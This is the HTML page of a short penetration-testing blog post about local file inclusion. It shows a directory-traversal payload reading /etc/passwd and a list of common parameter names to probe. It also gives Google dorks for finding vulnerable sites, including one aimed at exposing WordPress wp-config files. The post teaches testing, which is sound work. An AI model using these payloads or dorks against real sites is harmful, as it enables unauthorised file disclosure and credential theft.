<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup theme-color -->
<!-- start theme color meta headers -->
<meta name="theme-color" content="#151515">
<meta name="msapplication-navbutton-color" content="#151515">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- end theme color meta headers -->


<!-- Setup Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-RQVR6R8WR3"></script>
<script>
  window['ga-disable-G-RQVR6R8WR3'] = window.doNotTrack === "1" || navigator.doNotTrack === "1" || navigator.doNotTrack === "yes" || navigator.msDoNotTrack === "1";
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-RQVR6R8WR3');
</script>


<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->


<!-- Begin Jekyll SEO tag v2.7.1 -->
<title>LFI Parameters List | bt0’s Security Blog</title>
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="LFI Parameters List" />
<meta name="author" content="Humberto Jr (bt0)" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="LFI (Local File Inclusion)" />
<meta property="og:description" content="LFI (Local File Inclusion)" />
<link rel="canonical" href="https://humbertojunior.com.br/infosec/pentest/2021/02/16/lfi-parameters.html" />
<meta property="og:url" content="https://humbertojunior.com.br/infosec/pentest/2021/02/16/lfi-parameters.html" />
<meta property="og:site_name" content="bt0’s Security Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-02-16T00:00:00-03:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="LFI Parameters List" />
<script type="application/ld+json">
{"@type":"BlogPosting","url":"https://humbertojunior.com.br/infosec/pentest/2021/02/16/lfi-parameters.html","headline":"LFI Parameters List","dateModified":"2021-02-16T00:00:00-03:00","datePublished":"2021-02-16T00:00:00-03:00","author":{"@type":"Person","name":"Humberto Jr (bt0)"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://humbertojunior.com.br/infosec/pentest/2021/02/16/lfi-parameters.html"},"description":"LFI (Local File Inclusion)","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/">
          <h1>bt0's Security Blog</h1>
        </a>
        <h2>Just another Infosec Blog - Resources, Tutorial</h2>

        <section id="downloads">
          
          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">LFI Parameters List</h1>
    <p class="post-meta"><time class="dt-published" datetime="2021-02-16T00:00:00-03:00" itemprop="datePublished">
        Feb 16, 2021
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5149953309426611" crossorigin="anonymous"></script>
        <ins class="adsbygoogle"
        style="display:block; text-align:center;"
        data-ad-layout="in-article"
        data-ad-format="fluid"
        data-ad-client="ca-pub-5149953309426611"
        data-ad-slot="3196203233"></ins>
    <script>
       (adsbygoogle = window.adsbygoogle || []).push({});
    </script>
    <h2 id="lfi-local-file-inclusion">LFI (Local File Inclusion)</h2>

<p>Local file inclusion (also known as LFI) is the process of including
files, that are already locally present on the server, through the
exploiting of vulnerable inclusion procedures implemented in the
application. This vulnerability occurs, for example, when a page
receives, as input, the path to the file that has to be included and
this input is not properly sanitized, allowing directory traversal
characters (such as dot-dot-slash) to be injected. Although most
examples point to vulnerable PHP scripts, we should keep in mind that it
is also common in other technologies such as JSP, ASP and others. [1]</p>

<p>Example of test:</p>

<p>Consider the URL</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> http://vulnerable_host/preview.php?file=example.html
</code></pre></div></div>

<p>The parameter file= could be exploited to point it to another file
within the server</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> http://vulnerable_host/preview.php?file=../../../../etc/passwd
</code></pre></div></div>

<p>The expected result is shown below:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> root:x:0:0:root:/root:/bin/bash
 bin:x:1:1:bin:/bin:/sbin/nologin
 daemon:x:2:2:daemon:/sbin:/sbin/nologin
 alex:x:500:500:alex:/home/alex:/bin/bash
 margo:x:501:501::/home/margo:/bin/bash
 ...
</code></pre></div></div>

<p>There is a list of most common parameters to test for LFI</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ?cat=
 ?dir=
 ?action=
 ?board=
 ?date=
 ?detail=
 ?file=
 ?download=
 ?path=
 ?folder=
 ?prefix=
 ?include=
 ?page=
 ?inc=
 ?locate=
 ?show=
 ?doc=
 ?site=
 ?type=
 ?view=
 ?content=
 ?document=
 ?layout=
 ?mod=
 ?conf=
</code></pre></div></div>

<p>You can use Google Hacking and dorks to find vulnerable targets like:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> inurl:"wp-license.php?file=../..//wp-config"
</code></pre></div></div>

<p>File contain password and directory traversal vulnerability [2]</p>

<p>Using the same strategy to exploit wordpress and retrieve the wp-config,
you could use all those parameters above and create your own Google
Hacking Dork to analyze your target.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> inurl:"?cat=" site:"example.com" 
</code></pre></div></div>

<p>References:</p>

<p>[1] <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion">OWASP -
LFI</a></p>

<p>[2] <a href="https://www.exploit-db.com/ghdb/4940">GHDB</a></p>

<p>Thanks for following!</p>

  </div><a class="u-url" href="/infosec/pentest/2021/02/16/lfi-parameters.html" hidden></a>
</article>

      </section>
    </div>
  </body>
</html>